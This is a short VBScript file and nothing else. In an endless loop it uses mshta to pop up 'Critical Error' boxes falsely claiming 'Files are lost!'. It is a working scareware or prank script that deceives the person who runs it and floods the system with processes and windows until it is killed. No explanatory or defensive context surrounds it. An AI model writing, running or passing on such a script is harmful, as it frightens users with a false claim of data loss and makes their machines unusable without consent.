Set shell = CreateObject("WScript.Shell")

Do
    shell.Run "mshta vbscript:msgbox(""Files are lost!"",16,""Critical Error"")(window.close)"
Loop
